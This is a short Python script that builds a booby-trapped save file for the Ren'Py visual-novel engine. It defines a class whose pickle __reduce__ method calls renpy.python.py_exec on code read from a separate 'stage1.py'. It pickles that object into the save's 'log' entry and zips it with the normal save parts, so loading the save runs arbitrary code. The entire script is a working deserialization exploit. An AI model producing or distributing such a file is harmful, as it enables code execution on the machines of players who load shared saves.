import pickle
import renpy
import zipfile

# load our unsafe-python goodness
f = open("stage1.py", "rt")
payload = f.readlines()
f.close()

SCRIPT_PREFIX = """
import traceback

def print(*args):
    string = "".join([str(arg) for arg in list(args)])
    renpy.invoke_in_new_context(narrator, str(string))
    # return

def print_exc(string):
    renpy.invoke_in_new_context(narrator, str(string))

try:

"""

SCRIPT_SUFFIX = """

except Exception as exc:
    exc_msg = traceback.format_exc().splitlines()[::-1]
    print_exc("[EXCEPTION] " + str(exc_msg))
"""

# indent the whole injected payload
payload = "\n".join(["    " + l for l in payload])


class RCE(object):
    def __reduce__(self):
        return renpy.python.py_exec, (SCRIPT_PREFIX + payload + SCRIPT_SUFFIX,)


pickled = pickle.dumps(RCE())
with open("savegame_container/log", "wb") as f:
    f.write(pickled)

with zipfile.ZipFile("1-1-LT1.save", "w") as zip:
    zip.write("savegame_container/extra_info", "extra_info")
    zip.write("savegame_container/json", "json")
    zip.write("savegame_container/log", "log")
    zip.write("savegame_container/renpy_version", "renpy_version")
    zip.write("savegame_container/screenshot.png", "screenshot.png")
